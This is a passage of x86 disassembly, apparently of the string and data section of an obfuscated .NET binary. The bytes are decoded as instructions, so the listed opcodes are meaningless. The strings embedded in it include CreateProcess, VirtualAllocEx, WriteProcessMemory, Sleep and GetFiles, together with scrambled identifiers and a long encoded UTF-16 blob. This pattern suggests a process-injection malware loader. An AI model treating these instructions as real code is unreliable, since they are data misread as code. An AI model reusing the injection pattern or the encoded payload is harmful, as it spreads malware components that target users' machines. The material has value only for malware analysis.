100030b7:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100030be:	78 
100030bf:	74 65                	je     0x10003126
100030c1:	6e                   	outsb  %ds:(%esi),(%dx)
100030c2:	73 69                	jae    0x1000312d
100030c4:	6f                   	outsl  %ds:(%esi),(%dx)
100030c5:	6e                   	outsb  %ds:(%esi),(%dx)
100030c6:	00 53 79             	add    %dl,0x79(%ebx)
100030c9:	73 74                	jae    0x1000313f
100030cb:	65 6d                	gs insl (%dx),%es:(%edi)
100030cd:	2e 52                	cs push %edx
100030cf:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100030d2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100030d7:	6e                   	outsb  %ds:(%esi),(%dx)
100030d8:	00 53 65             	add    %dl,0x65(%ebx)
100030db:	61                   	popa
100030dc:	72 63                	jb     0x10003141
100030de:	68 4f 70 74 69       	push   $0x6974704f
100030e3:	6f                   	outsl  %ds:(%esi),(%dx)
100030e4:	6e                   	outsb  %ds:(%esi),(%dx)
100030e5:	00 45 78             	add    %al,0x78(%ebp)
100030e8:	63 65 70             	arpl   %esp,0x70(%ebp)
100030eb:	74 69                	je     0x10003156
100030ed:	6f                   	outsl  %ds:(%esi),(%dx)
100030ee:	6e                   	outsb  %ds:(%esi),(%dx)
100030ef:	00 5a 65             	add    %bl,0x65(%edx)
100030f2:	72 6f                	jb     0x10003163
100030f4:	00 53 6c             	add    %dl,0x6c(%ebx)
100030f7:	65 65 70 00          	gs gs jo 0x100030fb
100030fb:	4a                   	dec    %edx
100030fc:	62 56 47             	bound  %edx,0x47(%esi)
100030ff:	42                   	inc    %edx
10003100:	48                   	dec    %eax
10003101:	72 6e                	jb     0x10003171
10003103:	33 33                	xor    (%ebx),%esi
10003105:	64 75 46             	fs jne 0x1000314e
10003108:	31 42 49             	xor    %eax,0x49(%edx)
1000310b:	67 6a 77             	addr16 push $0x77
1000310e:	65 6f                	outsl  %gs:(%esi),(%dx)
10003110:	53                   	push   %ebx
10003111:	55                   	push   %ebp
10003112:	71 00                	jno    0x10003114
10003114:	53                   	push   %ebx
10003115:	79 73                	jns    0x1000318a
10003117:	74 65                	je     0x1000317e
10003119:	6d                   	insl   (%dx),%es:(%edi)
1000311a:	2e 4c                	cs dec %esp
1000311c:	69 6e 71 00 4d 68 61 	imul   $0x61684d00,0x71(%esi),%ebp
10003123:	44                   	inc    %esp
10003124:	77 75                	ja     0x1000319b
10003126:	7a 49                	jp     0x10003171
10003128:	6d                   	insl   (%dx),%es:(%edi)
10003129:	78 4d                	js     0x10003178
1000312b:	78 33                	js     0x10003160
1000312d:	79 36                	jns    0x10003165
1000312f:	36 72 00             	ss jb  0x10003132
10003132:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10003137:	00 49 6e             	add    %cl,0x6e(%ecx)
1000313a:	74 50                	je     0x1000318c
1000313c:	74 72                	je     0x100031b0
1000313e:	00 4a 6b             	add    %cl,0x6b(%edx)
10003141:	63 44 6c 65          	arpl   %eax,0x65(%esp,%ebp,2)
10003145:	53                   	push   %ebx
10003146:	72 53                	jb     0x1000319b
10003148:	54                   	push   %esp
10003149:	70 4c                	jo     0x10003197
1000314b:	4c                   	dec    %esp
1000314c:	39 30                	cmp    %esi,(%eax)
1000314e:	4a                   	dec    %edx
1000314f:	30 4d 33             	xor    %cl,0x33(%ebp)
10003152:	32 7a 50             	xor    0x50(%edx),%bh
10003155:	73 00                	jae    0x10003157
10003157:	53                   	push   %ebx
10003158:	79 73                	jns    0x100031cd
1000315a:	74 65                	je     0x100031c1
1000315c:	6d                   	insl   (%dx),%es:(%edi)
1000315d:	2e 44                	cs inc %esp
1000315f:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10003166:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
1000316d:	74 65                	je     0x100031d4
1000316f:	6d                   	insl   (%dx),%es:(%edi)
10003170:	2e 52                	cs push %edx
10003172:	75 6e                	jne    0x100031e2
10003174:	74 69                	je     0x100031df
10003176:	6d                   	insl   (%dx),%es:(%edi)
10003177:	65 2e 49             	gs cs dec %ecx
1000317a:	6e                   	outsb  %ds:(%esi),(%dx)
1000317b:	74 65                	je     0x100031e2
1000317d:	72 6f                	jb     0x100031ee
1000317f:	70 53                	jo     0x100031d4
10003181:	65 72 76             	gs jb  0x100031fa
10003184:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
1000318b:	73 74                	jae    0x10003201
1000318d:	65 6d                	gs insl (%dx),%es:(%edi)
1000318f:	2e 52                	cs push %edx
10003191:	75 6e                	jne    0x10003201
10003193:	74 69                	je     0x100031fe
10003195:	6d                   	insl   (%dx),%es:(%edi)
10003196:	65 2e 43             	gs cs inc %ebx
10003199:	6f                   	outsl  %ds:(%esi),(%dx)
1000319a:	6d                   	insl   (%dx),%es:(%edi)
1000319b:	70 69                	jo     0x10003206
1000319d:	6c                   	insb   (%dx),%es:(%edi)
1000319e:	65 72 53             	gs jb  0x100031f4
100031a1:	65 72 76             	gs jb  0x1000321a
100031a4:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100031ab:	62 75 67             	bound  %esi,0x67(%ebp)
100031ae:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100031b5:	65 
100031b6:	73 00                	jae    0x100031b8
100031b8:	47                   	inc    %edi
100031b9:	65 74 46             	gs je  0x10003202
100031bc:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
100031c3:	6e 
100031c4:	74 61                	je     0x10003227
100031c6:	69 6e 73 00 42 5a 76 	imul   $0x765a4200,0x73(%esi),%ebp
100031cd:	58                   	pop    %eax
100031ce:	70 4d                	jo     0x1000321d
100031d0:	71 4d                	jno    0x1000321f
100031d2:	61                   	popa
100031d3:	45                   	inc    %ebp
100031d4:	73 74                	jae    0x1000324a
100031d6:	71 73                	jno    0x1000324b
100031d8:	00 43 72             	add    %al,0x72(%ebx)
100031db:	65 61                	gs popa
100031dd:	74 65                	je     0x10003244
100031df:	50                   	push   %eax
100031e0:	72 6f                	jb     0x10003251
100031e2:	63 65 73             	arpl   %esp,0x73(%ebp)
100031e5:	73 00                	jae    0x100031e7
100031e7:	4f                   	dec    %edi
100031e8:	62 6a 65             	bound  %ebp,0x65(%edx)
100031eb:	63 74 00 48          	arpl   %esi,0x48(%eax,%eax,1)
100031ef:	45                   	inc    %ebp
100031f0:	71 48                	jno    0x1000323a
100031f2:	68 6c 55 67 34       	push   $0x3467556c
100031f7:	52                   	push   %edx
100031f8:	6d                   	insl   (%dx),%es:(%edi)
100031f9:	47                   	inc    %edi
100031fa:	4b                   	dec    %ebx
100031fb:	42                   	inc    %edx
100031fc:	68 31 78 61 5a       	push   $0x5a617831
10003201:	6e                   	outsb  %ds:(%esi),(%dx)
10003202:	74 00                	je     0x10003204
10003204:	43                   	inc    %ebx
10003205:	6f                   	outsl  %ds:(%esi),(%dx)
10003206:	6e                   	outsb  %ds:(%esi),(%dx)
10003207:	76 65                	jbe    0x1000326e
10003209:	72 74                	jb     0x1000327f
1000320b:	00 4e 65             	add    %cl,0x65(%esi)
1000320e:	78 74                	js     0x10003284
10003210:	00 53 79             	add    %dl,0x79(%ebx)
10003213:	73 74                	jae    0x10003289
10003215:	65 6d                	gs insl (%dx),%es:(%edi)
10003217:	2e 54                	cs push %esp
10003219:	65 78 74             	gs js  0x10003290
1000321c:	00 4d 5a             	add    %cl,0x5a(%ebp)
1000321f:	53                   	push   %ebx
10003220:	42                   	inc    %edx
10003221:	67 75 7a             	addr16 jne 0x1000329e
10003224:	75 35                	jne    0x1000325b
10003226:	62 58 65             	bound  %ebx,0x65(%eax)
10003229:	65 37                	gs aaa
1000322b:	78 30                	js     0x1000325d
1000322d:	4e                   	dec    %esi
1000322e:	74 66                	je     0x10003296
10003230:	7a 33                	jp     0x10003265
10003232:	57                   	push   %edi
10003233:	35 75 00 5a 44       	xor    $0x445a0075,%eax
10003238:	61                   	popa
10003239:	63 5a 62             	arpl   %ebx,0x62(%edx)
1000323c:	45                   	inc    %ebp
1000323d:	33 75 42             	xor    0x42(%ebp),%esi
10003240:	51                   	push   %ecx
10003241:	68 43 32 77 00       	push   $0x773243
10003246:	56                   	push   %esi
10003247:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
1000324e:	6c                   	insb   (%dx),%es:(%edi)
1000324f:	6c                   	insb   (%dx),%es:(%edi)
10003250:	6f                   	outsl  %ds:(%esi),(%dx)
10003251:	63 45 78             	arpl   %eax,0x78(%ebp)
10003254:	00 58 78             	add    %bl,0x78(%eax)
10003257:	49                   	dec    %ecx
10003258:	65 65 53             	gs gs push %ebx
1000325b:	5a                   	pop    %edx
1000325c:	71 4d                	jno    0x100032ab
1000325e:	51                   	push   %ecx
1000325f:	30 79 71             	xor    %bh,0x71(%ecx)
10003262:	66 39 6e 59          	cmp    %bp,0x59(%esi)
10003266:	51                   	push   %ecx
10003267:	53                   	push   %ebx
10003268:	34 79                	xor    $0x79,%al
1000326a:	00 56 6b             	add    %dl,0x6b(%esi)
1000326d:	42                   	inc    %edx
1000326e:	59                   	pop    %ecx
1000326f:	47                   	inc    %edi
10003270:	56                   	push   %esi
10003271:	32 76 6d             	xor    0x6d(%esi),%dh
10003274:	32 39                	xor    (%ecx),%bh
10003276:	75 44                	jne    0x100032bc
10003278:	43                   	inc    %ebx
10003279:	45                   	inc    %ebp
1000327a:	70 51                	jo     0x100032cd
1000327c:	31 52 35             	xor    %edx,0x35(%edx)
1000327f:	79 00                	jns    0x10003281
10003281:	54                   	push   %esp
10003282:	6f                   	outsl  %ds:(%esi),(%dx)
10003283:	41                   	inc    %ecx
10003284:	72 72                	jb     0x100032f8
10003286:	61                   	popa
10003287:	79 00                	jns    0x10003289
10003289:	57                   	push   %edi
1000328a:	72 69                	jb     0x100032f5
1000328c:	74 65                	je     0x100032f3
1000328e:	50                   	push   %eax
1000328f:	72 6f                	jb     0x10003300
10003291:	63 65 73             	arpl   %esp,0x73(%ebp)
10003294:	73 4d                	jae    0x100032e3
10003296:	65 6d                	gs insl (%dx),%es:(%edi)
10003298:	6f                   	outsl  %ds:(%esi),(%dx)
10003299:	72 79                	jb     0x10003314
1000329b:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
1000329f:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100032a4:	79 00                	jns    0x100032a6
100032a6:	6f                   	outsl  %ds:(%esi),(%dx)
100032a7:	70 5f                	jo     0x10003308
100032a9:	45                   	inc    %ebp
100032aa:	71 75                	jno    0x10003321
100032ac:	61                   	popa
100032ad:	6c                   	insb   (%dx),%es:(%edi)
100032ae:	69 74 79 00 4c 75 73 	imul   $0x6b73754c,0x0(%ecx,%edi,2),%esi
100032b5:	6b 
100032b6:	58                   	pop    %eax
100032b7:	71 48                	jno    0x10003301
100032b9:	4f                   	dec    %edi
100032ba:	78 41                	js     0x100032fd
100032bc:	43                   	inc    %ebx
100032bd:	34 32                	xor    $0x32,%al
100032bf:	31 7a 00             	xor    %edi,0x0(%edx)
100032c2:	51                   	push   %ecx
100032c3:	6b 50 6c 67          	imul   $0x67,0x6c(%eax),%edx
100032c7:	47                   	inc    %edi
100032c8:	61                   	popa
100032c9:	77 49                	ja     0x10003314
100032cb:	6c                   	insb   (%dx),%es:(%edi)
100032cc:	63 65 52             	arpl   %esp,0x52(%ebp)
100032cf:	35 66 61 59 53       	xor    $0x53596166,%eax
100032d4:	70 7a                	jo     0x10003350
100032d6:	00 00                	add    %al,(%eax)
100032d8:	00 84 d1 56 00 30 00 	add    %al,0x300056(%ecx,%edx,8)
100032df:	6c                   	insb   (%dx),%es:(%edi)
100032e0:	00 73 00             	add    %dh,0x0(%ebx)
100032e3:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
100032e7:	52                   	push   %edx
100032e8:	00 51 00             	add    %dl,0x0(%ecx)
100032eb:	4d                   	dec    %ebp
100032ec:	00 6d 00             	add    %ch,0x0(%ebp)
100032ef:	67 00 30             	add    %dh,(%bx,%si)
100032f2:	00 53 00             	add    %dl,0x0(%ebx)
100032f5:	6c                   	insb   (%dx),%es:(%edi)
100032f6:	00 4a 00             	add    %cl,0x0(%edx)
100032f9:	74 00                	je     0x100032fb
100032fb:	52                   	push   %edx
100032fc:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003300:	00 4a 00             	add    %cl,0x0(%edx)
10003303:	62 00                	bound  %eax,(%eax)
10003305:	48                   	dec    %eax
10003306:	00 56 00             	add    %dl,0x0(%esi)
10003309:	45                   	inc    %ebp
1000330a:	00 55 00             	add    %dl,0x0(%ebp)
1000330d:	44                   	inc    %esp
1000330e:	00 4a 00             	add    %cl,0x0(%edx)
10003311:	6f                   	outsl  %ds:(%esi),(%dx)
10003312:	00 4e 00             	add    %cl,0x0(%esi)
10003315:	45                   	inc    %ebp
10003316:	00 70 00             	add    %dh,0x0(%eax)
10003319:	58                   	pop    %eax
1000331a:	00 53 00             	add    %dl,0x0(%ebx)
1000331d:	57                   	push   %edi
1000331e:	00 78 00             	add    %bh,0x0(%eax)
10003321:	31 00                	xor    %eax,(%eax)
10003323:	52                   	push   %edx
10003324:	00 46 00             	add    %al,0x0(%esi)
10003327:	41                   	inc    %ecx
10003328:	00 79 00             	add    %bh,0x0(%ecx)
1000332b:	61                   	popa
1000332c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003330:	00 4b 00             	add    %cl,0x0(%ebx)
10003333:	63 00                	arpl   %eax,(%eax)
10003335:	47                   	inc    %edi
10003336:	00 4a 00             	add    %cl,0x0(%edx)
10003339:	48                   	dec    %eax
1000333a:	00 56 00             	add    %dl,0x0(%esi)
1000333d:	30 00                	xor    %al,(%eax)
1000333f:	6c                   	insb   (%dx),%es:(%edi)
10003340:	00 73 00             	add    %dh,0x0(%ebx)
10003343:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
10003347:	52                   	push   %edx
10003348:	00 51 00             	add    %dl,0x0(%ecx)
1000334b:	4d                   	dec    %ebp
1000334c:	00 6d 00             	add    %ch,0x0(%ebp)
1000334f:	67 00 30             	add    %dh,(%bx,%si)
10003352:	00 53 00             	add    %dl,0x0(%ebx)
10003355:	6c                   	insb   (%dx),%es:(%edi)
10003356:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
1000335a:	00 62 00             	add    %ah,0x0(%edx)
1000335d:	48                   	dec    %eax
1000335e:	00 56 00             	add    %dl,0x0(%esi)
10003361:	45                   	inc    %ebp
10003362:	00 55 00             	add    %dl,0x0(%ebp)
10003365:	44                   	inc    %esp
10003366:	00 4a 00             	add    %cl,0x0(%edx)
10003369:	6f                   	outsl  %ds:(%esi),(%dx)
1000336a:	00 4e 00             	add    %cl,0x0(%esi)
1000336d:	45                   	inc    %ebp
1000336e:	00 70 00             	add    %dh,0x0(%eax)
10003371:	57                   	push   %edi
10003372:	00 61 00             	add    %ah,0x0(%ecx)
10003375:	30 00                	xor    %al,(%eax)
10003377:	6c                   	insb   (%dx),%es:(%edi)
10003378:	00 58 00             	add    %bl,0x0(%eax)
1000337b:	53                   	push   %ebx
1000337c:	00 57 00             	add    %dl,0x0(%edi)
1000337f:	78 00                	js     0x10003381
10003381:	31 00                	xor    %eax,(%eax)
10003383:	52                   	push   %edx
10003384:	00 46 00             	add    %al,0x0(%esi)
10003387:	41                   	inc    %ecx
10003388:	00 79 00             	add    %bh,0x0(%ecx)
1000338b:	61                   	popa
1000338c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003390:	00 4b 00             	add    %cl,0x0(%ebx)
10003393:	56                   	push   %esi
10003394:	00 30                	add    %dh,(%eax)
10003396:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
1000339a:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
1000339e:	00 52 00             	add    %dl,0x0(%edx)
100033a1:	51                   	push   %ecx
100033a2:	00 4d 00             	add    %cl,0x0(%ebp)
100033a5:	6d                   	insl   (%dx),%es:(%edi)
100033a6:	00 67 00             	add    %ah,0x0(%edi)
100033a9:	30 00                	xor    %al,(%eax)
100033ab:	53                   	push   %ebx
100033ac:	00 6b 00             	add    %ch,0x0(%ebx)
100033af:	68 00 53 00 64       	push   $0x64005300
100033b4:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100033b8:	00 4a 00             	add    %cl,0x0(%edx)
100033bb:	62 00                	bound  %eax,(%eax)
100033bd:	48                   	dec    %eax
100033be:	00 56 00             	add    %dl,0x0(%esi)
100033c1:	45                   	inc    %ebp
100033c2:	00 55 00             	add    %dl,0x0(%ebp)
100033c5:	44                   	inc    %esp
100033c6:	00 4a 00             	add    %cl,0x0(%edx)
100033c9:	6f                   	outsl  %ds:(%esi),(%dx)
100033ca:	00 4e 00             	add    %cl,0x0(%esi)
100033cd:	45                   	inc    %ebp
100033ce:	00 70 00             	add    %dh,0x0(%eax)
100033d1:	58                   	pop    %eax
100033d2:	00 53 00             	add    %dl,0x0(%ebx)
100033d5:	57                   	push   %edi
100033d6:	00 78 00             	add    %bh,0x0(%eax)
100033d9:	31 00                	xor    %eax,(%eax)
100033db:	52                   	push   %edx
100033dc:	00 46 00             	add    %al,0x0(%esi)
100033df:	41                   	inc    %ecx
100033e0:	00 79 00             	add    %bh,0x0(%ecx)
100033e3:	61                   	popa
100033e4:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100033e8:	00 4b 00             	add    %cl,0x0(%ebx)
100033eb:	53                   	push   %ebx
100033ec:	00 55 00             	add    %dl,0x0(%ebp)
100033ef:	64 00 47 00          	add    %al,%fs:0x0(%edi)
100033f3:	56                   	push   %esi
100033f4:	00 30                	add    %dh,(%eax)
100033f6:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
100033fa:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
100033fe:	00 52 00             	add    %dl,0x0(%edx)
10003401:	51                   	push   %ecx
10003402:	00 4d 00             	add    %cl,0x0(%ebp)
10003405:	6d                   	insl   (%dx),%es:(%edi)
10003406:	00 67 00             	add    %ah,0x0(%edi)
10003409:	30 00                	xor    %al,(%eax)
1000340b:	53                   	push   %ebx
1000340c:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003410:	00 4a 00             	add    %cl,0x0(%edx)
10003413:	62 00                	bound  %eax,(%eax)
10003415:	48                   	dec    %eax
10003416:	00 56 00             	add    %dl,0x0(%esi)
10003419:	45                   	inc    %ebp
1000341a:	00 55 00             	add    %dl,0x0(%ebp)
1000341d:	44                   	inc    %esp
1000341e:	00 4a 00             	add    %cl,0x0(%edx)
10003421:	6f                   	outsl  %ds:(%esi),(%dx)
10003422:	00 4e 00             	add    %cl,0x0(%esi)
10003425:	45                   	inc    %ebp
10003426:	00 70 00             	add    %dh,0x0(%eax)
10003429:	7a 00                	jp     0x1000342b
1000342b:	59                   	pop    %ecx
1000342c:	00 6b 00             	add    %ch,0x0(%ebx)
1000342f:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10003433:	53                   	push   %ebx
10003434:	00 57 00             	add    %dl,0x0(%edi)
10003437:	78 00                	js     0x10003439
10003439:	31 00                	xor    %eax,(%eax)
1000343b:	52                   	push   %edx
1000343c:	00 46 00             	add    %al,0x0(%esi)
1000343f:	41                   	inc    %ecx
10003440:	00 79 00             	add    %bh,0x0(%ecx)
10003443:	61                   	popa
10003444:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003448:	00 4b 00             	add    %cl,0x0(%ebx)
1000344b:	56                   	push   %esi
1000344c:	00 30                	add    %dh,(%eax)
1000344e:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
10003452:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10003456:	00 52 00             	add    %dl,0x0(%edx)
10003459:	51                   	push   %ecx
1000345a:	00 4d 00             	add    %cl,0x0(%ebp)
1000345d:	6d                   	insl   (%dx),%es:(%edi)
1000345e:	00 67 00             	add    %ah,0x0(%edi)
10003461:	30 00                	xor    %al,(%eax)
10003463:	53                   	push   %ebx
10003464:	00 6a 00             	add    %ch,0x0(%edx)
10003467:	6c                   	insb   (%dx),%es:(%edi)
10003468:	00 71 00             	add    %dh,0x0(%ecx)
1000346b:	57                   	push   %edi
1000346c:	00 56 00             	add    %dl,0x0(%esi)
1000346f:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
10003473:	62 00                	bound  %eax,(%eax)
10003475:	48                   	dec    %eax
10003476:	00 56 00             	add    %dl,0x0(%esi)
10003479:	45                   	inc    %ebp
1000347a:	00 55 00             	add    %dl,0x0(%ebp)
1000347d:	44                   	inc    %esp
1000347e:	00 4a 00             	add    %cl,0x0(%edx)
10003481:	6f                   	outsl  %ds:(%esi),(%dx)
10003482:	00 4e 00             	add    %cl,0x0(%esi)
10003485:	45                   	inc    %ebp
10003486:	00 70 00             	add    %dh,0x0(%eax)
10003489:	58                   	pop    %eax
1000348a:	00 53 00             	add    %dl,0x0(%ebx)
1000348d:	57                   	push   %edi
1000348e:	00 78 00             	add    %bh,0x0(%eax)
10003491:	31 00                	xor    %eax,(%eax)
10003493:	52                   	push   %edx
10003494:	00 46 00             	add    %al,0x0(%esi)
10003497:	41                   	inc    %ecx
10003498:	00 79 00             	add    %bh,0x0(%ecx)
1000349b:	61                   	popa
1000349c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100034a0:	00 4b 00             	add    %cl,0x0(%ebx)
100034a3:	57                   	push   %edi
100034a4:	00 46 00             	add    %al,0x0(%esi)
100034a7:	4a                   	dec    %edx
100034a8:	00 73 00             	add    %dh,0x0(%ebx)
100034ab:	56                   	push   %esi
100034ac:	00 30                	add    %dh,(%eax)
100034ae:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
100034b2:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
100034b6:	00 52 00             	add    %dl,0x0(%edx)
100034b9:	51                   	push   %ecx
100034ba:	00 4d 00             	add    %cl,0x0(%ebp)
100034bd:	6d                   	insl   (%dx),%es:(%edi)
100034be:	00 67 00             	add    %ah,0x0(%edi)
100034c1:	30 00                	xor    %al,(%eax)
100034c3:	53                   	push   %ebx
100034c4:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100034c8:	00 4a 00             	add    %cl,0x0(%edx)
100034cb:	62 00                	bound  %eax,(%eax)
100034cd:	48                   	dec    %eax
100034ce:	00 56 00             	add    %dl,0x0(%esi)
100034d1:	45                   	inc    %ebp
100034d2:	00 55 00             	add    %dl,0x0(%ebp)
100034d5:	44                   	inc    %esp
100034d6:	00 4a 00             	add    %cl,0x0(%edx)
100034d9:	6f                   	outsl  %ds:(%esi),(%dx)
100034da:	00 4e 00             	add    %cl,0x0(%esi)
100034dd:	45                   	inc    %ebp
100034de:	00 70 00             	add    %dh,0x0(%eax)
100034e1:	4a                   	dec    %edx
100034e2:	00 52 00             	add    %dl,0x0(%edx)
100034e5:	7a 00                	jp     0x100034e7
100034e7:	46                   	inc    %esi
100034e8:	00 58 00             	add    %bl,0x0(%eax)
100034eb:	53                   	push   %ebx
100034ec:	00 57 00             	add    %dl,0x0(%edi)
100034ef:	78 00                	js     0x100034f1
100034f1:	31 00                	xor    %eax,(%eax)
100034f3:	52                   	push   %edx
100034f4:	00 46 00             	add    %al,0x0(%esi)
100034f7:	41                   	inc    %ecx
100034f8:	00 79 00             	add    %bh,0x0(%ecx)
100034fb:	61                   	popa
100034fc:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003500:	00 4b 00             	add    %cl,0x0(%ebx)
10003503:	56                   	push   %esi
10003504:	00 30                	add    %dh,(%eax)
10003506:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
1000350a:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
1000350e:	00 52 00             	add    %dl,0x0(%edx)
10003511:	51                   	push   %ecx
10003512:	00 4d 00             	add    %cl,0x0(%ebp)
10003515:	6d                   	insl   (%dx),%es:(%edi)
10003516:	00 67 00             	add    %ah,0x0(%edi)
10003519:	30 00                	xor    %al,(%eax)
1000351b:	53                   	push   %ebx
1000351c:	00 6d 00             	add    %ch,0x0(%ebp)
1000351f:	78 00                	js     0x10003521
10003521:	69 00 56 00 31 00    	imul   $0x310056,(%eax),%eax
10003527:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
1000352b:	62 00                	bound  %eax,(%eax)
1000352d:	48                   	dec    %eax
1000352e:	00 56 00             	add    %dl,0x0(%esi)
10003531:	45                   	inc    %ebp
10003532:	00 55 00             	add    %dl,0x0(%ebp)
10003535:	44                   	inc    %esp
10003536:	00 4a 00             	add    %cl,0x0(%edx)
10003539:	6f                   	outsl  %ds:(%esi),(%dx)
1000353a:	00 4e 00             	add    %cl,0x0(%esi)
1000353d:	45                   	inc    %ebp
1000353e:	00 70 00             	add    %dh,0x0(%eax)
10003541:	58                   	pop    %eax
10003542:	00 53 00             	add    %dl,0x0(%ebx)
10003545:	57                   	push   %edi
10003546:	00 78 00             	add    %bh,0x0(%eax)
10003549:	31 00                	xor    %eax,(%eax)
1000354b:	52                   	push   %edx
1000354c:	00 46 00             	add    %al,0x0(%esi)
1000354f:	41                   	inc    %ecx
10003550:	00 79 00             	add    %bh,0x0(%ecx)
10003553:	61                   	popa
10003554:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003558:	00 4b 00             	add    %cl,0x0(%ebx)
1000355b:	4f                   	dec    %edi
1000355c:	00 58 00             	add    %bl,0x0(%eax)
1000355f:	6c                   	insb   (%dx),%es:(%edi)
10003560:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
10003564:	00 30                	add    %dh,(%eax)
10003566:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
1000356a:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
1000356e:	00 52 00             	add    %dl,0x0(%edx)
10003571:	51                   	push   %ecx
10003572:	00 4d 00             	add    %cl,0x0(%ebp)
10003575:	6d                   	insl   (%dx),%es:(%edi)
10003576:	00 67 00             	add    %ah,0x0(%edi)
10003579:	30 00                	xor    %al,(%eax)
1000357b:	53                   	push   %ebx
1000357c:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003580:	00 4a 00             	add    %cl,0x0(%edx)
10003583:	62 00                	bound  %eax,(%eax)
10003585:	48                   	dec    %eax
10003586:	00 56 00             	add    %dl,0x0(%esi)
10003589:	45                   	inc    %ebp
1000358a:	00 55 00             	add    %dl,0x0(%ebp)
1000358d:	44                   	inc    %esp
1000358e:	00 4a 00             	add    %cl,0x0(%edx)
10003591:	6f                   	outsl  %ds:(%esi),(%dx)
10003592:	00 4e 00             	add    %cl,0x0(%esi)
10003595:	45                   	inc    %ebp
10003596:	00 70 00             	add    %dh,0x0(%eax)
10003599:	54                   	push   %esp
1000359a:	00 51 00             	add    %dl,0x0(%ecx)
1000359d:	6e                   	outsb  %ds:(%esi),(%dx)
1000359e:	00 42 00             	add    %al,0x0(%edx)
100035a1:	58                   	pop    %eax
100035a2:	00 53 00             	add    %dl,0x0(%ebx)
100035a5:	57                   	push   %edi
100035a6:	00 78 00             	add    %bh,0x0(%eax)
100035a9:	31 00                	xor    %eax,(%eax)
100035ab:	52                   	push   %edx
100035ac:	00 46 00             	add    %al,0x0(%esi)
100035af:	41                   	inc    %ecx
100035b0:	00 79 00             	add    %bh,0x0(%ecx)
100035b3:	61                   	popa
100035b4:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
100035b8:	00 4b 00             	add    %cl,0x0(%ebx)
100035bb:	56                   	push   %esi
100035bc:	00 30                	add    %dh,(%eax)
100035be:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
100035c2:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
100035c6:	00 52 00             	add    %dl,0x0(%edx)
100035c9:	51                   	push   %ecx
100035ca:	00 4d 00             	add    %cl,0x0(%ebp)
100035cd:	6d                   	insl   (%dx),%es:(%edi)
100035ce:	00 67 00             	add    %ah,0x0(%edi)
100035d1:	30 00                	xor    %al,(%eax)
100035d3:	53                   	push   %ebx
100035d4:	00 6d 00             	add    %ch,0x0(%ebp)
100035d7:	4a                   	dec    %edx
100035d8:	00 70 00             	add    %dh,0x0(%eax)
100035db:	51                   	push   %ecx
100035dc:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100035e0:	00 4a 00             	add    %cl,0x0(%edx)
100035e3:	62 00                	bound  %eax,(%eax)
100035e5:	48                   	dec    %eax
100035e6:	00 56 00             	add    %dl,0x0(%esi)
100035e9:	45                   	inc    %ebp
100035ea:	00 55 00             	add    %dl,0x0(%ebp)
100035ed:	44                   	inc    %esp
100035ee:	00 4a 00             	add    %cl,0x0(%edx)
100035f1:	6f                   	outsl  %ds:(%esi),(%dx)
100035f2:	00 4e 00             	add    %cl,0x0(%esi)
100035f5:	45                   	inc    %ebp
100035f6:	00 70 00             	add    %dh,0x0(%eax)
100035f9:	58                   	pop    %eax
100035fa:	00 53 00             	add    %dl,0x0(%ebx)
100035fd:	57                   	push   %edi
100035fe:	00 78 00             	add    %bh,0x0(%eax)
10003601:	31 00                	xor    %eax,(%eax)
10003603:	52                   	push   %edx
10003604:	00 46 00             	add    %al,0x0(%esi)
10003607:	41                   	inc    %ecx
10003608:	00 79 00             	add    %bh,0x0(%ecx)
1000360b:	61                   	popa
1000360c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
